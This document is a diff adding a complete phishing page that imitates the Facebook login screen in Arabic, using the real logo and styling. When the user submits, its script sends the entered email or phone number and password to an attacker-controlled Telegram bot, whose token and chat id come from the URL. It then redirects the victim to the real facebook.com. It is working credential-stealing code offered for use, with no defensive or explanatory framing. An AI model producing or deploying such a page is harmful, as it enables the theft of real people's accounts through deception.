@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Facebook – Log In</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);padding:20px;width:396px;text-align:center}img{width:240px;margin-bottom:10px}input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline-color:#1877f2}.btn{width:100%;background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin:12px 0}a{color:#1877f2;font-size:14px;text-decoration:none}a:hover{text-decoration:underline}hr{margin:20px 0;border:0;border-top:1px solid #dadde1}</style></head>
+<body><div class="card">
+<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+<p style="color:#606770;font-size:15px;margin-bottom:12px">تسجيل الدخول إلى فيسبوك</p>
+<input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+<input type="password" id="pass" placeholder="كلمة المرور">
+<button class="btn" onclick="send()">تسجيل الدخول</button>
+<a href="#">هل نسيت كلمة المرور؟</a><hr>
+<button style="background:#42b72a;color:#fff;border:none;padding:12px 20px;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer">إنشاء حساب جديد</button>
+</div>
+<script>
+const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
+function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
+if(!e||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('📘 فيسبوك\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://facebook.com'})}
+</script></body></html>
